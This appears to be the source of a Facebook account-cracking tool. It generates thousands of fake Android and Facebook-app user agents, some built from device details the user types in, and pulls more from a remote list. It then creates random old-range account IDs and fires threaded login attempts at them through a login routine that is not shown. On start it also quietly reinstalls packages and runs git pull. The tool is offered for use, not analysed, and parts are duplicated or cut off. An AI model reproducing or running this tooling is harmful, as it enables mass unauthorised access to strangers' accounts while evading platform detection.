import os, sys, uuid, re, random, time, string, json, base64

try:

    os.system(
        'pip uninstall requests chardet urllib3 idna certifi rich -y;pip install chardet urllib3 idna certifi requests rich')
    import requests, rich, certifi, pycurl
except:
    os.system("git pull")

    os.system("pip3 install requests rich certifi pycurl")

    import requests, rich, certifi, pycurl

from rich import print
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor as ThreadPool

from io import BytesIO
import os
import random
import string
import sys
import threading
import time
import uuid
import rich
from datetime import datetime
from rich import print
import requests
import certifi
from concurrent.futures import ThreadPoolExecutor as ThreadPool

version = "  v1"


# get system data

class sort:

    def line():
        return "[b dark_sea_green2]━" * 37

    def clear():
        os.system("clear")

    def logo():
        aci = f'''        //   ) )                                      
       //___/ /  __     ( )   __      ___      ___    
      / ____ / //  ) ) / / //   ) ) //   ) ) //___) ) 
     //       //      / / //   / / //       //        
    //       //      / / //   / / ((____   ((____{version}\n{sort.line()}\n     [red1]✗ [chartreuse1]Developer [orange3]▶  [chartreuse1]PRINCE\n     [red1]✗ [light_green]Status    [orange3]▶  [medium_purple1][r]PAID[/r]\n{sort.line()}'''
        print(aci)

    def color():
        co = ['\x1b[1;93m', '\x1b[1;91m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m']
        cx = random.choice(co)
        return cx


def info():
    sort.clear()
    print('[b][red1]WELCOME TO MY TOOL          ')
    time.sleep(3)
    if not os.path.exists('device_info.txt'):
        os.system('clear')
        print(sort.logo())
        print(" What is your android version ex 8,9,10")
        version_ = input(' Type android version : ')
        print(44 * '-')
        print(" Your mobile model ex Techno LD7 or Oppo CPH2095 etc")
        model_ = input(" Model name : ")
        print(44 * "-")
        print(" Your mobile company name ex Techno,Redmi")
        brand_name_ = input(" Device company name : ")
        print(44 * '-')
        print(" Your mobile width ex 720,740,730,780 etc")
        width_ = input(" Device width : ")
        print(44 * '-')
        print(" Your mobile height ex 1660,1780,1730 etc")
        height_ = input(" Device height: ")
        info_file = open("device_info.txt", "a").write(
            version_ + '$' + model_ + '$' + brand_name_ + '$' + width_ + '$' + height_)
    time.sleep(4)
    sort.clear()
    # print("[deep_pink2][[orange3]▶[deep_pink2]] [chartreuse1]JOIN MESSANGER GROUP ... ")
    # os.system("xdg-open https://www.facebook.com/HeronAfridi.Official");time.sleep(2)
    # print("[deep_pink2][[orange3]▶[deep_pink2]] [chartreuse1]REVIEW TOOL OWNER ... ")
    # os.system("xdg-open https://m.me/j/AbYhZTf4PCEUXDNP/");time.sleep(2)
    # print("[deep_pink2][[orange3]▶[deep_pink2]] [chartreuse1]JOIN CHANNEL ... ")
    # os.system("xdg-open https://t.me/TeamElite_Channel");time.sleep(2)


# ---------# Global
oks = []
loop = 0
sys_ua = []
ua = []
ugen = []
cp = []
for xd in range(5000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen.append(uaku)


    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for xd in range(3000):
    build_nokiax = ['JDQ39','JZO54K']
    rr = random.randint; rc = random.choice
    miui_v3 = ['-g','-gn','-go','-gn','gzip(gfe)',' swan-mibrowser']
    miui_v1 = ['0','1','2','3','4','5','6','7','8','9','10','11','12']
    miui_v2 = ['0','1','2','3','4','5','6','7','8','9','10','11','14','22','27','36']
    aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
    basa = ['en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr']
    gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550    5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']
    ugent1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}"
    ugent2 = f"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/{str(rc(build_nokiax))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 NokiaBrowser/7.{str(rr(1,5))}.1.{str(rr(16,37))} {str(rc(aZ))}{str(rr(1,1000))}"
    ugent3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; {str(rc(basa))}; Redmi 5 Plus Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(40,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/{str(rr(1,99))}.{str(rc(miui_v1))}.{str(rc(miui_v2))}{str(rc(miui_v3))} {str(rc(aZ))}{str(rr(1,1000))}"
    memekk = random.choice([ugent1, ugent2, ugent3])
    ugen.append(memekk)
    
for t in range(10000):
    aa='Mozilla/5.0 (Linux; Android 7.0; '
    b=random.choice(['8.1.0','4','5','6','7','8','9','10','11','12'])
    c='Hisense F102) '
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.67'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku)
for x in range(1000):
    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
    b=random.randrange(100, 9999)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
    ugen.append(uak)




def cont(li):
    if li < 10:
        return "0" + str(li)
    else:
        return str(li)


# ---------# Date
month = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July",
         "08": "August", "09": "September", "10": "October", "11": "November", "12": "December", }
today_data = str(datetime.now()).split(" ")[0].split("-")
today = today_data[2] + "\x1b[1;97m." + month.get(today_data[1])


# ---------#Old Date
def uaxxxx():
    rr = random.randint
    aZ = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    rx = random.randrange(1, 999)
    xx = f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9, 11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99, 149))}.0.{str(rr(4500, 4999))}.{str(rr(35, 99))} Chrome/{str(rr(99, 175))}.0.{str(rr(0, 5))}.{str(rr(0, 5))} Safari/537.36"
    return xx


# "Dalvik/2.1.0 (Linux; U; Android "+version_+"; "+model_+" Build/QP1A.190711.020) [FBAN/MobileAdsManagerAndroid;FBAV/"+377.0.0.13.101;FBBV/"+str(random.randint(412627882,419003907))+";FBRV/0;FBLC/en_US;FBMF/"+brand_name_+" MOBILE LIMITED;FBBD/"+brand_name_+";FBDV/TECNO LD7;FBSV/"+version_+";FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,width="+width_+",height="+height_+"};FB_FW/1;]"

# Dalvik/2.1.0 (Linux; U; Android 12; Infinix X669 Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/377.0.0.13.101;FBPN/com.facebook.orca;FBLC/en_US;FBBV/396116327;FBCR/MTN;FBMF/INFINIX;FBBD/Infinix;FBDV/Infinix X669;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1444};FB_FW/1;]

# Dalvik/2.1.0 (Linux; U; Android 13; Oppo CPH2095 Build/TW8A.198993.015) [FBAN/Orca-Android;FBAV/279.1.0.51.155;FBPN/com.facebook.orca;FBLC/en_US;FBBV/398105929;FBCR/MTN;FBMF/Oppo;FBBD/Oppo;FBDV/Oppo CPH2095;FBSV/13;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1;]


for brand in range(1000):
    a = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    b = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    c = str(random.randint(1, 9))
    d = str(random.randint(10, 20))
    abc = a + b + c
    if not os.path.exists('device_info.txt'):
        info()
    else:
        infos = open('device_info.txt', 'r').read()
        version_, model_, brand_name_, width_, height_ = infos.split('$')
        uaaa = "Dalvik/2.1.0 (Linux; U; Android " + version_ + "; " + model_ + " Build/" + abc + "A." + str(
            random.randint(190000, 199999)) + ".0" + d + ") [FBAN/Orca-Android;FBAV/" + str(
            random.randint(200, 350)) + "." + str(random.randint(0, 1)) + ".0." + str(
            random.randint(20, 70)) + "." + str(
            random.randint(110, 280)) + ";FBPN/com.facebook.orca;FBLC/en_US;FBBV/" + str(random.randint(390000000,
                                                                                                        399999999)) + ";FBCR/MTN;FBMF/" + brand_name_ + ";FBBD/" + brand_name_ + ";FBDV/""" + model_ + ";FBSV/" + version_ + ";FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=" + width_ + ",height=" + height_ + "};FB_FW/1;]"
        sys_ua.append(uaaa)


def Samsung():
    Anderson = random.choice(
        ["10", "13", "7.0.0", "7.1.1", "9", "12", "11", "9.0", "8.0.0", "7.1.2", "7.0", "4", "5", "4.4.2", "5.1.1",
         "6.0.1", "9.0.1"])
    model = random.choice(
        ["GT-I9505", "SM-T835", "SM-S901U", "MMB29K", "SM-S134DL", "SM-J250F", "SM-A217F", "SM-A326B", "SM-A125F",
         "SM-A720F", "SM-A326U", "SM-G532M", "SM-J410G", "SM-A205GN", "SM-A205GN", "SM-A505GN", "SM-G930F", "SM-J210F",
         "SM-N9005", "SM-J210F"])
    vir = str(random.choice(range(111111111, 999999999)))
    cho = str(random.choice(range(43, 447)))
    fb = random.choice(["com.facebook.adsmanager|MobileAdsManagerAndroid", "com.facebook.katana|FB4A",
                        "com.facebook.orca|Orca-Android", "com.facebook.mlite|MessengerLite"])
    FBAN = fb.split("|")[1]
    platform = fb.split("|")[0]
    ua = f"Dalvik/2.1.0 (Linux; U; Android " + Anderson + "; " + model + " Build/LRX22C) [FBAN/" + FBAN + ";FBAV/" + cho + ".0.0.15.89;FBPN/" + platform + ";FBLC/sv_SE;FBBV/" + vir + ";FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/" + model + ";FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=" + str(
        random.choice(range(1, 4))) + ".0,width=" + str(random.choice(range(720, 1500))) + ",height=" + str(
        random.choice(range(1500, 2000))) + "};FB_FW/1;]"
    return ua


# -----------#
def Motorola():
    fb_v1 = str(random.choice(range(111, 555)))  # "+fb_v1+"
    fb_v2 = str(random.choice(range(111, 555)))
    rdp1 = str(random.choice(range(111111111, 333333333)))  # "+rdp1+"
    rdp2 = str(random.choice(range(111111111, 333333333)))
    andv = str(random.choice(range(8, 12)))  # "+andv+"
    # modorola
    ua = "Dalvik/2.1.0 (Linux; U; Android " + andv + ".0.0; moto e5 plus Build/OPPS27.91-179-8-16) [FBAN/FB4A;FBAV/" + fb_v1 + ".0.0.50." + fb_v2 + ";FBPN/com.facebook.katana;FBLC/es_MX;FBBV/" + rdp1 + ";FBCR/null;FBMF/motorola;FBBD/motorola;FBDV/moto e5 plus;FBSV/" + andv + ".0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.7,width=720,height=1358};FB_FW/1;FBRV/0;]"

    return ua


def Vivo():
    fb_v1 = str(random.choice(range(111, 555)))  # "+fb_v1+"
    fb_v2 = str(random.choice(range(111, 555)))
    rdp1 = str(random.choice(range(111111111, 433333333)))  # "+rdp1+"
    rdp2 = str(random.choice(range(111111111, 433333333)))
    andv = str(random.choice(range(8, 12)))  # "+andv+"
    # vivo
    ua = "Dalvik/2.1.0 (Linux; U; Android " + andv + ".1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/" + fb_v1 + ".0.0.16." + fb_v2 + ";FBPN/com.facebook.orca;FBLC/en_US;FBBV/" + rdp1 + ";FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/" + andv + ".1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920"

    return ua


def lsb():
    upper = ''.join(random.choices(string.ascii_uppercase, k=6))
    lower = ''.join(random.choices(string.ascii_lowercase, k=4))
    number = ''.join(random.choices(string.digits, k=1))
    password = upper + lower + number
    password_list = list(password)
    random.shuffle(password_list)
    return ''.join(password_list)


def referer():
    upper = ''.join(random.choices(string.ascii_uppercase, k=6))
    lower = ''.join(random.choices(string.ascii_lowercase, k=6))
    number = ''.join(random.choices(string.digits, k=5))
    password = upper + lower + number
    password_list = list(password)
    random.shuffle(password_list)
    return ''.join(password_list)


# -----------#


def old():
    user = []
    sort.clear()
    sort.logo()
    print("[b]    [red1][A] [sea_green2]Crack 2011-14 Id")
    print("[b]    [red1][B] [spring_green1]Crack 2009-10 Id")
    print(sort.line())
    ask = input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m ")

    if ask in ["1", "01", "a", "A"]:
        print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]Uid 2011-14")
        print(sort.line())
        print("[b]     [red1]✗ [chartreuse1]Example   [orange3]▶  [chartreuse1]100000, 200000")
        limit = int(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
        print(sort.line())
        star = "10000"
        for i in range(limit):
            data = str(random.choice(range(1000000000, 9999999999)))
            user.append(data)
    else:
        star = "100000"
        print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]Uid 2009-10")
        print(sort.line())
        print("  [b]   [red1]✗ [chartreuse1]Example   [orange3]▶  [chartreuse1]100000, 200000")
        limit = int(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
        print(sort.line())

        for i in range(limit):
            data = str(random.choice(range(100000000, 999999999)))
            user.append(data)
    print("[b]    [red1][1] [sea_green2]Method A")
    print("[b]    [red1][2] [spring_green1]Method B")
    print(sort.line())
    meth = input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m ")

    with ThreadPool(max_workers=40) as heron:
        sort.clear()
        sort.logo()
        print(" [b]    [red1]✗ [chartreuse1]Total Uid [orange3]▶  [chartreuse1]" + str(len(user)))
        print(" [b]    [red1]✗ [light_green]Login Ids [orange3]▶  [light_green]Just Now")
        print(sort.line())
        for mal in user:
            uid = star + mal
            heron.submit(login, uid, meth)


try:
    url = "https://raw.githubusercontent.com/TEAM-ELITE1/database/main/XYA.txt"
    response = requests.get(url, verify=certifi.where())
    datax = response.text.splitlines()[0]
    for u in datax.split("|"):
        ua.append(u)
except Exception as e:
    print("[!!] Internet Error:", e)
    sys.exit()


def Samsung():
    Anderson = random.choice(["10", "13", "7.0.0", "7.1.1", "9", "12", "11", "9.0", "8.0.0", "7.1.2", "7.0", "4", "5",
                              "4.4.2", "5.1.1", "6.0.1", "9.0.1"])
    model = random.choice(["GT-I9505", "SM-T835", "SM-S901U", "MMB29K", "SM-S134DL", "SM-J250F", "SM-A217F",
                           "SM-A326B", "SM-A125F", "SM-A720F", "SM-A326U", "SM-G532M", "SM-J410G", "SM-A205GN",
                           "SM-A205GN", "SM-A505GN", "SM-G930F", "SM-J210F", "SM-N9005", "SM-J210F"])
    vir = str(random.choice(range(111111111, 999999999)))
    cho = str(random.choice(range(43, 447)))
    fb = random.choice(["com.facebook.adsmanager|MobileAdsManagerAndroid", "com.facebook.katana|FB4A",
                        "com.facebook.orca|Orca-Android", "com.facebook.mlite|MessengerLite"])
    FBAN = fb.split("|")[1]
    platform = fb.split("|")[0]
    ua = f"Dalvik/2.1.0 (Linux; U; Android {Anderson}; {model} Build/LRX22C) [FBAN/{FBAN};FBAV/{cho}.0.0.15.89;FBPN/{platform};FBLC/sv_SE;FBBV/{vir};FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/{model};FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{{density={random.choice(range(1, 4))}.0,width={random.choice(range(720, 1500))},height={random.choice(range(1500, 2000))};FB_FW/1;]"
    return ua


def dd(fbbd, device):
    if fbbd.lower() == "samsung":
        return random.choice(
            ["GT-I9505", "SM-T835", "SM-S901U", "MMB29K", "SM-S134DL", "SM-J250F", "SM-A217F", "SM-A326B", "SM-A125F",
             "SM-A720F", "SM-A326U", "SM-G532M", "SM-J410G", "SM-A205GN", "SM-A205GN", "SM-A505GN", "SM-G930F",
             "SM-J210F", "SM-N9005", "SM-J210F"])
    elif fbbd.lower() == "vivo":
        return random.choice(["vivo 1935", "V3Max"])
    elif fbbd.lower() == "motorola":
        return random.choice(
            ['Moto E2 (4G LTE)', 'Moto E3 Power', 'Moto E4', 'Moto E4 Plus', 'Moto E5', 'Moto E5 Plus', 'Moto G',
             'Moto G 2nd Gen', 'Moto G Play', 'Moto G3', 'Moto G3 Turbo Edition', 'Moto G4', 'Moto G5 Plus', 'Moto G5s',
             'Moto G5s Plus', 'Moto G6', 'Moto X', 'moto g power (2021)'])
    elif fbbd.lower() == "oppo":
        return random.choice(["CPH" + str(random.choice(range(1000, 2000))), "oppo r7sm"])
    elif fbbd.lower() == "oneplus":
        return random.choice(["A0001", "OnePlus 11R", "OnePlus 10T", "OnePlus Nord 3 5G"])
    elif fbbd.lower() == "google":
        return random.choice(["Pixel 6a", "Pixel 3"])
    elif fbbd.lower() == "asus":
        return random.choice(["ASUS_X01BDA", "ASUS_Z01QD", "ASUS_I005DC", "NX55", "MXB48T"])
    elif fbbd.lower() == "huawei":
        return random.choice(
            ["DUB-LX1", "AGS2-L09", "POT-LX1", "DRA-LX2", "POT-LX3", "VOG-L29", "EVR-N29", "FIG-LX1", "Kirin Treble",
             "HUAWEI LUA-L21", "ATU-L31", "COL-L29", "NAM-LX9", "VOG-L29", "JKM-LX1", "RNE-L22"])
    elif fbbd.lower() == "lenovo":
        return random.choice(
            ["Lenovo TB-X505F", "Lenovo A6020a46", 'PAFR0026IN', 'PAFR0026', 'PAFR0033IN', 'PAFR0033', 'PAFR0013IN',
             'PAFR0013', 'PAGW0015IN', 'L39051', 'XT2091-8'])
    elif fbbd.lower() == "sony":
        return random.choice(
            ["C2105", "C2104", "G3312", "G3311", "G3313", "LT29i", "D6503", "D6502", "SO-03F", "Xperia Z2", "D6503",
             "D6502", "SO-03F", "Xperia Z2", "D6563", "D6603", "D6653", "D6616", "D6643", "SO-01G", "SOL26", "D6646",
             "D5803", "D5833", "SO-02G", "D6633", "D6603", "D6643", "D6653", "D6616", "D6683", "SGP621", "SGP611",
             "E6533", "D6708"])
    elif fbbd.lower() == "tecno":
        return random.choice(["CG8", "CG8h", "LB8", "LB8a", "CH7n", "CH7", "LH6n"])
    else:
        return device


def generate_random_string(lowercase_count, numeric_count):
    lowercase_chars = string.ascii_lowercase
    numeric_chars = string.digits

    lowercase_part = ''.join(random.choices(lowercase_chars, k=lowercase_count))
    numeric_part = ''.join(random.choices(numeric_chars, k=numeric_count))

    return lowercase_part + numeric_part


def shuffle_string(s):
    shuffled_list = list(s)
    random.shuffle(shuffled_list)
    return ''.join(shuffled_list)


lowercase_count = 16
numeric_count = 18

low = 10
num = 22

ran_string = generate_random_string(low, num)
